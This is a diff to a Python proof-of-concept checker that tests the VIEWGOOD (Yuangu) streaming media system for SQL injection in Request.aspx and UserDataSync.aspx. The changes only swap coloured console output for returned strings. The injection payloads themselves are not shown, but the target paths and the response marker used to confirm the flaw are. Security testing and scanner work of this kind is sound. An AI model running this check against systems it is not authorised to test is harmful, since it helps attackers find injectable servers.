@@ -9,8 +9,8 @@ description: 文件Request.aspx和UserDataSync.aspx中,POST参数存在SQL注入
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class viewgood_two_sqli_BaseVerify:
     def __init__(self, url):
@@ -28,7 +28,7 @@ class viewgood_two_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
-                cprint("[+]存在远古流媒体系统两处SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data), "red")
+                return "[+]存在远古流媒体系统两处SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data)
 
             vulnurl = self.url + "/VIEWGOOD/ADI/portal/UserDataSync.aspx"
             post_data = {
@@ -36,12 +36,12 @@ class viewgood_two_sqli_BaseVerify:
             }
             req = requests.get(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
-                cprint("[+]存在远古流媒体系统两处SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data), "red")
+                return "[+]存在远古流媒体系统两处SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = viewgood_two_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
